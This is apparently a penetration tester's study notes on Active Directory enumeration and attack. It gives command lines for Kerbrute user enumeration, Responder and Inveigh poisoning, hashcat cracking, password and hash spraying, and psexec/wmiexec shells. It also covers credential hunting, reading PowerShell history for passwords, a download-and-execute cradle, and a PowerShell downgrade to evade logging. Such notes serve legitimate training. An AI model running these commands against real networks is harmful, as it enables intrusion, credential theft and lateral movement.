---
title: Notes | AD Enumeration
author: Zeropio
date: 2022-08-15
categories: [Notes, System]
tags: [windows, ad]
permalink: /notes/system/ad-enumeration
---

# Initial Enumeration
---
title: Notes | AD Enumeration & Attack
author: Zeropio
date: 2022-08-15
categories: [Notes, System]
tags: [windows, ad]
permalink: /notes/system/ad-enum-attack
---
## Passive Enumeration

The first thing we should do is a external reconnaissance of the target. We should search for:
- **IP Space**
- **Domain Information**
- **Schema Format**
- **Data Disclosures**
- **Breach Data**

The table below lists a few potential resources and examples that can be used:

| **Target**   | **Resource**    |
|--------------- | --------------- |
| **ASN / IP registrars** | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/) |
| **Domain registrars & DNS** | [Domaintools](https://www.domaintools.com/), [ViewDNS](https://viewdns.info), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/en), manual DNS record |
| **Social Media** | Linkedin, Twitter, Facebook,... |
| **Public-Facing Company Websites** | public website for a corporation will have relevant info embedded |
| **Cloud & Dev Storage Spaces** | [GitHub](https://github.com/ ), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Dorks](https://www.exploit-db.com/google-hacking-database) |
| **Breach Data Sources** | [haveibeenpwned](https://haveibeenpwned.com/), [DeHashed](https://www.dehashed.com/),... |

With **BPG-Toolkit** we can just search a domain or IP address and the web will search any results. Take in mind that smaller enterprise which host their webs in another infrastructure are out of scope. Tools like [linkedin2username](https://github.com/initstring/linkedin2username) can help us creating userlists.

## Active Enumeration

When enumerating for a AD, we should look for:

| **Data**   | **Description**    |
|--------------- | --------------- |
| **AD Users** | valid user accounts we can target for password spraying |
| **AD Joined Computers** | Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers,... |
| **Key Services** | Kerberos, NetBIOS, LDAP, DNS |
| **Vulnerable Hosts and Services** | easy host to exploit and gain a foothold |

First, let's take some time to listen to the network and see what's going on. We can use **Wireshark**. If we are on a host without a GUI, we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](http://www.netminer.com/main/main-read.do), ...
```console
zero@pio$ sudo tcpdump -i <INTERFACE>
```

We can even use Responder:
```console
zero@pio$ sudo responder -I <INTERFACE> -A
```

Our passive checks have given us a few hosts to note down for a more in-depth enumeration. After this passive enumeration we can start and active enumeration with [fping](https://fping.org/). 
```console
zero@pio$ fping -asgq 172.16.5.0/23
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-a` | show targets that are alive |
| `-s` | print stats at the end |
| `-g` | generate a target list from the CIDR network |
| `-q` | show per-target results |

In the Nmap output we can see the **Domain Controller**. We can use Nmap for a wide scan:
```console
zero@pio$ sudo nmap -v -A -iL hosts.txt -oN discover_targets
```

Let's now enumerate users. We can use the [Kerbrute](https://github.com/ropnop/kerbrute) tool for a stealthier enumeration. We will use it with the list of [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames0), **jsmith.txt** pr **jsmith2.txt**. We can download the binary from [here](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) or make it:
```console
zero@pio$ sudo git clone https://github.com/ropnop/kerbrute.git
zero@pio$ make help; sudo make all
```

The newly created `dist`{: .filepath} directory will contain our compiled binaries. We can test it now:
```console
zero@pio$ ./kerbrute_linux_amd64 
```

If we want we can add it as a command:
```console
zero@pio$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

Now we can use it as a command:
```console
zero@pio$ kerbrute userenum -d <DOMAIN> --dc <DC IP> <USERLIST> -o <OUTPUT FILE>
```

---

# LLMNR/NBT-NS Poisoning

## Linux 

**Link-Local Multicast Name Resolution** (**LLMNR**) and **NetBIOS Name Service** (**NBT-NS**) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. LLMNR use the **port UDP 5355**. NBT-NS utilizes **port 137 over UDP**. LLMNR/NBT-NS are used for name resolution, any host on the network can reply. We **Responder** we can posion these requests. The effort is making the victim communicating with our system. If the requested host requieres name resolution or authentication actions, we can capture the NetNTLM. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. Combined with the lack of SMB signing can lead to administrative access.

The attack flow:
1. A host attempts to connect to the print server at **\\print01.<DOMAIN>**, but accidentally types in **\\printer01.<DOMAIN>**.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of **\\printer01.<DOMAIN>**.
4. The attacker (Responder) responds to the host stating that it is the **\\printer01.<DOMAIN>** that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. The hash can be cracked offline.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:
- [Responder](https://github.com/lgandx/Responder)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
- [Metasploit](https://www.metasploit.com/)

Both tools (Responder and Inveigh) can be used to attack the following protocols:
- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth

Responder also has support for:
- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth

Responder is a relatively straightforward tool. Now we will use Responder in a active way. Some common flags we will use are:

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-A` | make Responder analyze mode, seeing NBT-NS, BROWSER, and LLMNR without poisoning |
| `-w` | built-in WPAD proxy server |
| `-wf` | WPAD rogue proxy server |
| `-f` | fingerprint remote host OS and version |
| `-v` | will increased the verbosity |
| `-F` or `-P` | force NTLM or Basic authentication and force proxy authentication (may cause login prompt) |

We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:
```
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

If Responder successfully captured hashes, as seen above, we can find the hashes associated with each host/protocol in their own text file. We can start a Responder session:
```console
zero@pio$ sudo responder -I <INTERFACE>
```

We can use `hashcat` to crack with the option 5600:
```console
zero@pio$ hashcat -m 5600 <HASH FILE> <WORDLIST>
```

## From Windows 

LLMNR & NBT-NS poisoning is possible from a Windows host as well. Let's do with the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh). It is written in C# and PowerShell. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that list all aviable parameters. Let's import the tool:
```console
PS C:\zeropio> Import-Module .\Inveigh.ps1
ps C:\zeropio> (Get-Command Invoke-Inveigh).Parameters
```

A LLMNR and NBNS spoofing:
```console
PS C:\zeropio> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

The PowerShell version of Inveigh is the original version and is no longer updated. The author maintains the C# version of it. We can run it as:
```console
PS C:\zeropio> \Inveigh.exe
```

The tool start showing us the options enabled and disabled. The option `[+]` are enabled by default, the options `[ ]` are disabled by default. We can hit the `esc` key to enter the console while Inveigh is running:
```console
...
C(0:0) NTLMv1(0:0) NTLMv2(3:9)>
```

After typing `HELP` we can see many options. We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`. We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.

---

# Password Spraying

Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. Beware of password spraying, because it can be harmful to the organization. In real life environments add delays between some tries.

## Password Policy

First we need the password policy. We can get it in several ways, like [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient`:
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --pass-pol
```

This will tell us the password policy from the domain. Without credentials we can get the password policy via **SMB NULL** or **LDAP anonymous bind**. SMB NULL sessions allow us to retrieve information without being authenticated. For enumeration we can use tools like **enum4linux**, **CrackMapExec**, **rpcclient**,...
```console
zero@pio$ rpcclient -U "" -N <IP>

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

The query `querydominfo` will give us info about the domain, while `getdompwinfo` will tell us the password policy. The tool **enum4linux** works similar:
```console
zero@pio$ enum4linux -P <IP>
```

We can use **enum4linux-ng**, which has additional features like exporting in a file:
```console
zero@pio$ enum4linux-ng -P <IP> -oA <OUTPUT FILE>
```

**LDAP anonymous binds** allow us to retrieve information about the domain. We can use tools like **windapsearch.py**, **ldapsearch**, **ad-ldapdomaindump.py**,... Let's see the password policy:
```console
zero@pio$ ldapsearch -h <IP> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

From Windows we can use the binary `net.exe`. As some tools like PowerView, CrackMapExec, SharpMapExec, SharpView,...
```console
C:\zeropio> net accounts
```

With PowerView:
```console
PS C:\zeropio> import-module .\PowerView.ps1
PS C:\zeropio> Get-DomainPolicy
```

PowerView give us the same output as `net accounts`, but also reveal if the password complexity is enabled.

**We should avoid locking accounts. If the maximun tries are 5, try only 2-3 before stopping.**

## User List 

We can get a valid list of users;
- SMB NULL retrieving a complete list of domain users
- LDAP anonymous bind to pull down the domain user list
- **Kerbrute** to validate users from a wordlist, like [this](https://github.com/insidetrust/statistically-likely-usernames) or from a [tool](https://github.com/initstring/linkedin2username)
- With a LLMNR/NBT-NS poisoning using Responder

### SMB NULL 

We can use **enum4linux** with the flag `-U`:
```console
zero@pio$ enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

The `enumdomusers` from rpcclient:
```console
zero@pio$ rpcclient -U "" -N <IP> 
rpcclient $> enumdomusers
```

Or CrackMapExec with the flag `--users`. This will also show the **badpwdcount** (invalid login attempts), also the **baddpwdtime** (date and time of the last bad password attempt), so we can see how close we are from a **badpwdcount** reset.
```console
zero@pio$ crackmapexec smb <IP> --users
```

### LDAP Anonymous

We can use [windapsearch](https://github.com/ropnop/windapsearch) or [ldapsearch](https://linux.die.net/man/1/ldapsearch):
```console
zero@pio$ ldapsearch -h <IP> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

**windapsearch** make it easy. Use the `-u` flag to provide a blank username and `-U` to retrieve the users:
```console
zero@pio$ ./windapsearch.py --dc-ip <IP> -u "" -U
```

### Kerbrute 

If we don't have access we can use **Kerbrute** to enumerate valid AD users. Kerberos Pre-Authentication is faster and stealthier than the others methods. This doesn't generate Windows events or logon failure. The tool send TGT to the domain controller, if the KDC responds with `PRINCIPAL UNKNOWN` the user is invalid. We can use the userlist [jsmith.txt](https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt). The wordlist [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) is a good source for Kerbrute.
```console
zero@pio$ kerbrute userenum -d <DOMAIN> --dc <IP> jsmith-txt
```

We will check over 48,000 usernames in 12 seconds. If *Kerberos event logging* is enabled in Group Policy, this will generate event ID 4768.

### Credentialed Enumeration

With credentials we can enumerate with any of the previous tools:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <VALID USER> -p <VALID PASSWORD> --users
```

## From Linux 

With a userlist, now we can start the password spraying. **rpcclient** can be useful for performing the attack from Linux. Take in mind that a valid login is not immediately response **Authority Name**
. We can filter out by grepping for **Authority**:
```bash
for u in $(cat <USERLIST>);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority; done
```

We can also use **Kerbrute**:
```console
zero@pio$ kerbrute passwordspray -d <DOMAIN> --dc <IP> <USERLIST> <PASSWORD>
```

With **CrackMapExec**, we must `grep +` to only show valid users:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <USERLIST> -p <PASSWORD> | grep +
```

After getting a valid credentials, we can try it:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <USER> -p <PASSWORD>
```

This is not only possible with domain user accounts. If we obtain administrative access and the password (NTLM or cleartext), is common to see password reuse of administrative accounts. CrackMapExec will help us with this attack. Take in mind that if we find a password like **$desktop%@admin123**, it is possible to exist the password **$server%@admin123**.

If we only has the NTLM hash for the local administrator, we can spray it across the subnet. The following command will try to login as local administrator. The `--local-auth` will log in one time in each machine (to not block administrative account for the domain):
```console
zero@pio$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <HASH> | grep +
```

## From Windows 

In Windows we can use the tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray). If the host is domain joined we can skip the flag `-UserList` and let the tool generate the list:
```console
PS C:\zeropio> Import-Module .\DomainPasswordSpray.ps1
PS C:\zeropio> Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile <OUTPUT FILE> -ErrorAction SilentlyContinue
```

Kerbrute can also be used.

---

# Enumerating Security Controls 

After gaining foothold we need to enumerate the domain further. 

### Windows Defender 

Windows Defender is a really powerfull firwall, which will block toools such as PowerView. To get an overview of it we can see in the PowerShell:
```console
PS C:\zeropio> Get-MpComputerStatus
```

Here we can also see if Windows Defender is on or off.

### AppLocker 

Is an application whitelist of approved software. Organizations often block PowerShell.exe, but forget about other PowerShell executables like `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`{: .filepath} or `PowerShell_ISE.exe`{: .filepath}. Sometimes AppLocker will have more restrictive policies. We can see the policies:
```console
PS C:\zeropio> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### PowerShell Constrained Language Mode 

**PowerShell Constrained Language Mode** block many features, such as COM objects, PowerShell classes, XAML-based workflows,... We can check if we are in a *Full Language Mode* or *Constrained Language Mode*:
```console
PS C:\zeropio> $ExecutionContext.SessionState.LanguageMode
```

### LAPS 

The **Microsoft Local Administrator Password Solution** (**LAPS**) randomize and rotate local administrator passwords, to prevent lateral movement. We can enumerate which machines has installed and which not. We can use the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) for it. 
```console
PS C:\zeropio> Find-LAPSDelegatedGroups 
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with *All Extended Rights*. Those users can read LAPS passwords, so you should check it:
```console
PS C:\zeropio> Find-AdmPwdExtendedRights
```

We can search computers with LAPS enabled when passwords expire (even the randomized passwords in cleartext if our user has access):
```console
PS C:\zeropio> Get-LAPSComputers
```

## From Linux 

### CrackMapExec

[CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) can be used here. After gaining credentials, we can use CrackMapExec to enumerate:

- Users 

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD>  
```

- Groups and membercount

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --groups
```

- Logged users

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --loggedon-users
```

- Shares

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --shares
```

We can some shares with the property **READ**. The module **spider_plus** could help us dig in them:
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -M spider_plus --share '<SHARED FOLDER>'
```

This will crete a JSON in `/tmp/cme_spider_plus/<IP>`{: .filepath} with the results.

### SMBMap 

SMBMap is a great choice for enumerating SMB shares from Linux. For example:
```console
zero@pio$ smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <IP>
```

Once we have seen the shares, we can select one:
```console
zero@pio$ smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <IP> -R '<SHARED FOLDER>' --dir-only
```

The flag `--dir-only` only ouput directories, not files.

### rpcclient 

As we have seen, we can exploit the SMB NULL sessions with it:
```console
zero@pio$ rpcclient -U "" -N <TARGET>

rpcclient $> 
```

While looking at users here we can see a `rid:` parameter. The **Relative Identifier** (**RID**) is a unique identifier for Windows objects. However, there are accounts that will have the same RID. The Administrator account will always be *RID [administrator] rid:[0x1f4]*, which equals **500**. That value is calculated from the name of the object. We can search it as:
```console
rpcclient $> query user 0x<HEX CODE>
```

Using `enumdomusers` will tell us the users' RID.

### Impacket Toolkit 

For this we will be using the [wmiexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/wmiexec.py) and [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py). **psexec.py** is one of the most useful tools from Impacket. Is a clone of the sysinternals psexec executable. It creates a remote service, uploading a randomly name executable to the **ADMIN$** share. It register the service via **RPC** and **Windows Service Control Manager**, giving a remote shell as SYSTEM. We need the credentials for the local administrator to do it.
```console
zero@pio$ psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

**wmiexec.py** utilizes a semi-interactive shell. Commands are executed through **Windows Management Instrumentation**. This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems.
```console
zero@pio$ wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

### Windapsearch 

[Windapsearch](https://github.com/ropnop/windapsearch) is another tool for enumerating using LDAP queries. For example:
```console
zero@pio$ python3  windapsearch.py --dc-ip <IP> -u <USER>@<DOMAIN> -p <PASSWORD> --da
zero@pio$ python3  windapsearch.py --dc-ip <IP> -u <USER>@<DOMAIN> -p <PASSWORD> -PU
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `--da` | enumerate domain admins group members |
| `-PU` | find privileged users |

### Bloodhound.py 

With domain credentials we can run [BloodHound.py](https://github.com/fox-it/BloodHound.py). This tool is one of the most helpful in AD pentesting. Initially was written for PowerShell, but this Python version allow us running from a Linux (it requires Impacket, ldap3 and dnspython). For example, a command to retrieve anythin:
```console
zero@pio$ sudo bloodhound-python -u '<USER>' -p '<PASSWORD>' -ns <IP> -d <DOMAIN> -c all
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-c`/`--collectionmethod <TPYE>` | set what we want to collect |

Once it is down it will create some files (**...computers.json**, **...domains.json**, **...groups.json** and **...users.json**). We could use now [neo4j](https://neo4j.com/). Start the service as `sudod neo4j start`. Start the GUI version of Bloodhound and upload the data. We can upload each JSON or the zip (`zip -r target.zip *.json`). 

Now go to the **Analysis** to run queries against the database. We can use built-in queries like **Path Finding**. **Find Shortest Paths To Domain Admins** query will create a map of the AD. 

## From Windows 

### ActiveDirectory PowerShell Module 

The [ActiveDirectory PowerShell Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) is a groupf of cmdlets for administering AD from the command line. First, make sure it is imported:
```console
PS C:\zeropio> Get-Module
PS C:\zeropio> Import-Module ActiveDirectory 
PS C:\zeropio> Get-Module 
```

First. we'll enumerate the domain:
```console
PS C:\zeropio> Get-ADDomain
```

This will print the domain SID, domain functional level, child domains, ... Next the users, filtering by **ServicePrincipalName**. This will get a list of accounts susceptible of Kerberoasting attack:
```console
PS C:\zeropio> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Verify domain trust relationships. We can determine if there are trusts within our forest or with domains in others forest, the type of trust, direction and name of the domain the relationship is with.
```console
PS C:\zeropio> Get-ADTrust -Filter *
```

Next get the AD group information:
```console
PS C:\zeropio> Get-ADGroup -Filter * | select name
```

We can use the name of a interesing group and check it:
```console
PS C:\zeropio> Get-ADGroup -Identity "Backup Operators"
```

To get a member list of a group:
```console
PS C:\zeropio> Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView 

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us. Similar to BloodHound, provides a bunch of information. This are some of the functionalities it has:

| **Command**   | **Description**    |
|--------------- | --------------- |
| `Export-PowerViewCSV` | append results to a CSV file |
| `ConvertTo-SID` | convert a user or group name to the SID value |
| `Get-DomainSPNTicket` | requests the Kerberos ticket for a specified SPN account |
| **Domain/LDAP Functions** |
| `Get-Domain` | return the AD object for the current (or specified) domain |
| `Get-DomainController` | Return a list of the Domain Controllers for the specified domain |
| `Get-DomainUser` | Will return all users or specific user objects in AD |
| `Get-DomainComputer` |	Will return all computers or specific computer objects in AD |
| `Get-DomainGroup` |	Will return all groups or specific group objects in AD |
| `Get-DomainOU` |	Search for all or specific OU objects in AD |
| `Find-InterestingDomainAcl` |	Finds object ACLs in the domain with modification rights set to non-built in objects |
| `Get-DomainGroupMember` |	Will return the members of a specific domain group |
| `Get-DomainFileServer` |	Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare` |	Returns a list of all distributed file systems for the current (or specified) domain |
| **GPO Functions** |	
| `Get-DomainGPO` |	Will return all GPOs or specific GPO objects in AD |
| `Get-DomainPolicy` |	Returns the default domain policy or the domain controller policy for the current domain |
| **Computer Enumeration Functions** |
| `Get-NetLocalGroup` |	Enumerates local groups on the local or a remote machine |
| `Get-NetLocalGroupMember` |	Enumerates members of a specific local group |
| `Get-NetShare` |	Returns open shares on the local (or a remote) machine |
| `Get-NetSession` |	Will return session information for the local (or a remote) machine |
| `Test-AdminAccess` |	Tests if the current user has administrative access to the local (or a remote) machine |
| **Threaded 'Meta'-Functions** |
| `Find-DomainUserLocation` |	Finds machines where specific users are logged in |
| `Find-DomainShare` |	Finds reachable shares on domain machines |
| `Find-InterestingDomainShareFile` |	Searches for files matching specific criteria on readable shares in the domain |
| `Find-LocalAdminAcces` |s	Find machines on the local domain where the current user has local administrator access |
| **Domain Trust Functions** |
| `Get-DomainTrust` |	Returns domain trusts for the current domain or a specified domain |
| `Get-ForestTrust` |	Returns all forest trusts for the current forest or a specified forest |
| `Get-DomainForeignUser` |	Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember` |	Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping	Will` | enumerate all trusts for the current domain and any others seen. |

To get domain information, using known credentials:
```console
PS C:\zeropio> Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

We can use now the following command to retrieve group-specific information:
```console
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

With the last output we can take an idea of target for elevation of privileges. Let's see now the domain trust:
```console
PS C:\zeropio> Get-DomainTrustMapping
```

We can test for local admin access on our machine or remote. We can use the same command on each host, to test if we have admin access.
```console
PS C:\zeropio> Test-AdminAccess -ComputerName <TARGET>
```

We can find users with SPN set:
```console
PS C:\zeropio> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

Currently, PowerView is deprecated. Empire 4 framework has been updating it since them [here](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1).

### SharpView 

Another tool worth to mention is SharpView, a .NET port of PowerView. PowerView can be used with SharpView. For example, enumerating a user:
```console
PS C:\zeropio> .\SharpView.exe Get-DomainUser -Identity <USER>
```
### Snaffler

[This](https://github.com/SnaffCon/Snaffler) tool help us acquiring credentials from AD environments. Snaffler obtains a list of hosts within the domain. enumerating those hosts for shares and readable directories. To execute Snaffler, we can use the command below:
```console
PS C:\zeropio> .\Snaffler.exe -s -d <DOMAIN> -o <LOG OUTPUT> -v data
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-s` | print the results in console |
| `-d` | select domain |
| `-o` | select logfile (ends by .log) | 
| `-v <type>` | verbosity |
| `data` | verbosity level, only displays results to the screen |

### BloodHound 

BloodHound is also aviable for Windows hosts. Executed as:
```console
PS C:\zeropio> .\SharpHound.exe --help
```

We can start the SharpHound.exe collector:
```console
PS C:\zeropio> .\SharpHound.exe -c All --zipfilename <TARGET>
```

We can send the data to our host or even in the BloodHound GUI from Windows, to use **neo4j**. Inside it, the query *Find Computers with Unsupported Operating Systems* is great for finding outdated and unsupported operating systems running legacy software.  We can run the query *Find Computers where Domain Users are Local Admin* to quickly see if there are any hosts where all users have local admin rights.

If we want to find the Kerberoastable accounts, inside the *Raw Query*:
```
MATCH (n:User)WHERE n.hasspn=true
RETURN n
```

## Living Off the Land 

This means to do all we can do it, without having access to internet or downloading our tools from our host. 

### CMD

First, we can do a basic enumeration commands: 

| **Command**   | **Description**    |
|--------------- | --------------- |
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` |	Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` |	Prints the patches and hotfixes applied to the host |
| `ipconfig /all` |	Prints out network adapter state and configurations |
| `set %USERDOMAIN%` |	Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `set %logonserver%` |	Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

We can also use the command `systeminfo` to get a overview of it.

### PowerShell

The Powershell can be a helpful tool also:

| **Cmd-let**   | **Description**    |
|--------------- | --------------- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` |	Will print the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` |	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` |	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `Get-ChildItem Env: | ft Key,Value	Return environment values such as key paths, users, computer information, etc.
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` |	This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

### Downgrading PowerShell

Many defenders are unaware that several versions of PowerShell often exist on a host.  Below is an example of downgrading Powershell:
```console
PS C:\zeropio> Get-host
PS C:\zeropio> powershell.exe -version 2
PS C:\zeropio> Get-host
```

This can change the log output. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged.

### Checking Defenses 

With the commands `netsh` and `sc` we can check the defenses of the host. For example, checking the firewall:
```console
PS C:\zeropio> netsh advfirewall show allprofiles
```

Windows Defender from the CMD:
```console
C:\zeropio> sc query windefend
```

Status and configuration of the Windows Defender:
```console
PS C:\zeropio> Get-MpComputerStatus
```

### Am I Alone? 

Check other logged accounts:
```console
PS C:\zeropio> qwinsta
```

### Network Information

| **Command**   | **Description**    |
|--------------- | --------------- |
| `arp -a` | Lists all known hosts stored in the arp table. |
| `ipconfig /all` |	Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` |	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` |	Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

`arp -a` and `route print` will show us what hosts the box we are on is aware of and what networks are known to the host. 

### Windows Management Instrumentation (WMI) 

| **Command**   | **Description**    |
|--------------- | --------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` |	Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` |	A listing of all processes on host |
| `wmic ntdomain list /format:list` |	Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` |	Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` |	Information about all local groups |
| `wmic sysaccount list /format:list` |	Dumps information about any system accounts that are being used as service accounts. |

This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) could help us.

### Net Commands 

We can list information such as:
- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

Using the `net.exe` binary:

| **Command**   | **Description**    |
|--------------- | --------------- |
| `net accounts` | Information about password requirements |
| `net accounts /domain` |	Password and lockout policy |
| `net group /domain` |	Information about domain groups |
| `net group "Domain Admins" /domain` |	List users with domain admin privileges |
| `net group "domain computers" /domain` |	List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` |	List PC accounts of domains controllers |
| `net group <domain_group_name> /domai` |n	User that belongs to the group |
| `net groups /domain` |	List of domain groups |
| `net localgroup` |	All available groups |
| `net localgroup administrators /domain` |	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| `net localgroup Administrators` |	Information about a group (admins) |
| `net localgroup administrators [username] /add` |	Add user to administrators |
| `net share` |	Check current shares |
| `net user <ACCOUNT_NAME> /domain` |	Get information about a user within the domain |
| `net user /domain` |	List all users of the domain |
| `net user %username%` |	Information about the current user |
| `net use x: \computer\share` |	Mount the share locally |
| `net view` |	Get a list of computers |
| `net view /all /domain[:domainname]` |	Shares on the domains |
| `net view \computer /ALL` |	List shares of a computer |
| `net view /domain` |	List of PCs of the domain |

### Dsquery 

Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. This tool will exist on any host with the **Active Directory Domain Services Role** installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`{: .filepath}.

| **Command**   | **Description**    |
|--------------- | --------------- |
| `dsquery user` | User search |
| `dsquery computer` | Computer search |
| `dsquery * "CN=Users,DC=<DOMAIN>,DC=LOCAL"` | Wildcard search |
| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Users with specific attributes set (**PASSWD_NOTREQD**) |
| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` | Domain controllers search |

We are using queries like `userAccountControl:1.2.840.113556.1.4.803:=8192`. That are strings in LDAP queries (ca be used also with AD PowerShell, ldapsearch,...)
. 

![LDAP Query](/assets/img/notes/system/UAC-values.png)

